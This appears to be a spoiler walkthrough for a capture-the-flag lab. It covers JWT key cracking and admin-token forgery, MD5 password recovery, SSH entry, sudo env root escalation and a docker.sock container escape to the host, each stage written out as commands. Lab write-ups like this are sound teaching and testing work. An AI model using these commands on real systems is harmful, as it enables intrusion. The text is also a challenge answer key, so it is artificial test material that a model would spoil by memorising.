# Walkthrough (spoiler)

This is the intended solution path. It is a spoiler for maintainers and for
verifying the challenge. Do not read it if you want to play.

Target ports (default mapping): 8080 web, 22 outer-host SSH, 23 web-container
SSH.

## Stage 0 - Recon

- Browse `http://TARGET:8080/`. It is a "Trent Identity Gateway" that hands out
  HS256 tokens. The page advertises an open demo account (`guest / guest`) and,
  in an HTML comment, notes that the token signing key was taken off a common
  wordlist and never rotated, and that admin tooling lives at `/api/admin`.

## Stage 1 - Forge an admin JWT (first inner flag)

- Log in as the demo user to get a token:
  `curl -s http://TARGET:8080/api/login -H 'Content-Type: application/json' -d '{"username":"guest","password":"guest"}'`.
  The returned JWT decodes to `{"sub":"guest","role":"user"}`.
- `/api/admin` with that token returns `403 admin role required`.
- The token is HS256 with a weak key. Crack it offline against a wordlist
  (`hashcat -m 16500 token.jwt rockyou.txt`, `john`, or any JWT cracker). The
  key is `trustno1`, a rockyou entry.
- Forge a new token with the cracked key and `role: admin`, then call the admin
  console:
  `curl -s http://TARGET:8080/api/admin -H "Authorization: Bearer <forged>"`.
- The response contains the first `FLAG{...}`, plus the user password store and a
  crackstation hint.

## Stage 2 - Crack the MD5 and enter the web container (second inner flag)

- The admin console lists unsalted MD5 hashes. `mallory` is
  `15cf0ae3726fdf8505b199e968106d68`, which reverses to `velvet123` (a rockyou
  entry; verify with `printf '%s' velvet123 | md5`). The `admin` hash is
  high-entropy and does not crack (red herring).
- `velvet123` is also mallory's SSH password on the web container, published on
  port 23: `ssh mallory@TARGET -p 23`.
- The admin console is the only practical source of this credential. `velvet123`
  sits at roughly rockyou line 330,000, deep enough that a naive online top-N SSH
  brute against port 23 (top-500/1000/10k lists) does not reach it, while an
  offline crack of the unsalted MD5 against full rockyou or a crackstation lookup
  recovers it instantly. So the forged admin JWT (Stage 1) is a required first
  step, not an optional one, for every inner-container flag.
- `cat ~/user.txt` gives the second `FLAG{...}`.

## Stage 3 - Web-container root (themed inner-root flag)

- `sudo -l` shows mallory may run `/usr/bin/env` as root with NOPASSWD.
- `sudo env /bin/sh` (GTFOBins) gives a root shell in the web container.
- `cat /root/root.txt` gives the `TOKEN_FLAG{...}`.

## Stage 4 - Break out to the outer host root (first outer flag)

- As root in the web container, `/var/run/docker.sock` is mounted and a static
  `docker` client is on `PATH`.
- Launch a container that mounts the outer host filesystem and read the flag:

  ```bash
  docker run --rm -v /:/host alpine cat /host/root/root.txt
  ```

- That prints the outer-host `MAIN_FLAG{...}` root flag.

## Stage 5 - Recover the outer user and SSH in (second outer flag)

- With the same outer root view, read the root-only onboarding note:

  ```bash
  docker run --rm -v /:/host alpine cat /host/root/onboarding.txt
  ```

- It discloses `victor`'s initial SSH password. Log in to the outer host:
  `ssh victor@TARGET -p 22`.
- `cat ~/user.txt` gives the outer-host `MAIN_FLAG{...}` user flag.
- Honesty note: the mounted `docker.sock` from Stage 4 is a full outer-root
  primitive, so the outer-user flag is also directly readable without SSH:
  `docker run --rm -v /:/host alpine cat /host/home/victor/user.txt`. The
  onboarding-note recovery and the `ssh victor` login are documented for
  completeness and realism; they gate nothing that the root mount does not already
  grant.

## Notes and red herrings

- The `admin` MD5 in the password store is a rotated high-entropy value and does
  not crack.
- `mallory`'s SSH password is intentionally a rockyou entry (line ~330,000) so
  the offline MD5 crack works instantly, but one deep enough that an online top-N
  brute against port 23 is not a shortcut around the JWT forge. Do not expect the
  top common passwords, or a top-10k list, to hit.
- `victor`'s password is high-entropy and is not meant to be cracked; it is
  recovered by reading a root-only file after the socket breakout.
- `/api/whoami` is a convenience endpoint for inspecting token claims; it is not
  a vector.
